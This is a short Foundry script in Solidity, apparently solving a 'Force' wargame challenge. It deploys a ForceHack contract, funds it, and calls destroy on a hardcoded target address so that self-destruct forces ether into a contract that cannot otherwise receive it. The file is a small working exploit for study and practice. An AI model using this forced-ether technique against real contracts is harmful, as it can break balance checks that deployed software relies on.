// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ForceHack.sol";
import "../src/Force.sol";

contract ForceHackScript is Script {
  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    uint256 deployerPrivateKey = vm.envUint("TEST_DEPLOYER_PRIVATE_KEY");
    address targetAddress = 0xD710C5AD4bF0e8866F8Aa15F223c3ee355d6e32B;

    // Deploy Force contract 
    // __ ONLY NEED BELOW STEP FOR TESTING LOCALLY, COULD ALSO JUST USE THE TARGET ADDRESS
    // vm.startBroadcast(deployerPrivateKey);
    // Force forceContract = new Force();
    // vm.stopBroadcast();

    // Deploy ForceHack contract
    vm.startBroadcast(attackerPrivateKey);
    ForceHack forceHackContract = new ForceHack();

    // Fund attacking address
    (bool sent, ) = address(forceHackContract).call{ value: 0.001 ether}("");
    
    // Send destroy call w/ target address
    forceHackContract.destroy(targetAddress);

    console.log("Target balance", targetAddress.balance);
    vm.stopBroadcast();

  }
}